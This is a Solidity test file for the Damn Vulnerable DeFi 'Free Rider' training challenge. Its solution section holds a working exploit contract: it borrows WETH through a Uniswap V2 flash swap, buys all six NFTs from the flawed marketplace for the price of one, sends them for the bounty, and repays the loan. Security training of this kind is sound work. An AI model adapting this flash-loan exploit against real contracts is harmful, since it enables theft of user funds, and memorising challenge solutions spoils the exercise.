// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    // uint256 constant 6 = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint 6 to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(6);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](6);
        uint256[] memory prices = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < 6; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */


    function test_freeRider() public checkSolvedByPlayer {

            FreeRiderAttacker attacker = new FreeRiderAttacker{value: 0.05 ether}(
                address(uniswapV2Factory),
                payable(address(weth)),
                address(nft),
                address(recoveryManager),
                address(marketplace)
            );

            // Initiate the flash swap attack
            attacker.initiateFlashSwap(address(weth), address(token), 15 ether, 0);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}


contract FreeRiderAttacker is IERC721Receiver {
    address public uniswapFactory; // Address of the UniswapV2Factory
    WETH public wethToken; // WETH token interface
    DamnValuableNFT public nftToken; // NFT token interface
    address public recoveryAddress; // Address to transfer stolen NFTs
    address public nftMarketplace; // Address of the NFT marketplace

    constructor(
        address _uniswapFactory,
        address payable _weth,
        address _nftToken,
        address _recoveryAddress,
        address _nftMarketplace
    ) payable {
        // Initialize contract state
        uniswapFactory = _uniswapFactory;
        wethToken = WETH(_weth);
        nftToken = DamnValuableNFT(_nftToken);
        recoveryAddress = _recoveryAddress;
        nftMarketplace = _nftMarketplace;

        // Deposit 0.05 ether to WETH
        wethToken.deposit{value: 0.05 ether}();
    }

    // Function to initiate a flash swap
    function initiateFlashSwap(
        address token0, // Address of token0 in the pair
        address token1, // Address of token1 in the pair
        uint amount0Out, // Amount of token0 to borrow
        uint amount1Out  // Amount of token1 to borrow
    ) external {
        // Get the pair address from Uniswap factory
        address pair = IUniswapV2Factory(uniswapFactory).getPair(token0, token1);
        require(pair != address(0), "Pair not found");

        // Initiate the flash swap
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), "flashSwap");
    }

    // Callback function for the flash swap
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        // Verify the caller is the expected Uniswap pair
        require(
            msg.sender == IUniswapV2Factory(uniswapFactory).getPair(
                IUniswapV2Pair(msg.sender).token0(),
                IUniswapV2Pair(msg.sender).token1()
            ),
            "Invalid sender"
        );

        // Withdraw 15 ether from WETH
        wethToken.withdraw(15 ether);

        // Prepare an array of token IDs to purchase
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Buy NFTs from the marketplace
        FreeRiderNFTMarketplace(payable(nftMarketplace)).buyMany{value: 15 ether}(tokenIds);

        // Transfer NFTs to the recovery address
        bytes memory transferData = abi.encode(tx.origin); // Include original sender info
        for (uint256 j = 0; j < 6; j++) {
            nftToken.safeTransferFrom(address(this), recoveryAddress, j, transferData);
        }

        // Re-deposit 15 ether back into WETH
        wethToken.deposit{value: 15 ether}();

        // Calculate flash swap fee and repay
        uint256 fee = ((amount0 > 0 ? amount0 : amount1) * 3) / 997 + 1;
        if (amount0 > 0) {
            IERC20(IUniswapV2Pair(msg.sender).token0()).transfer(msg.sender, amount0 + fee);
        }
    }

    // Receive Ether
    receive() external payable {}

    // ERC721 callback function to accept NFT transfers
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

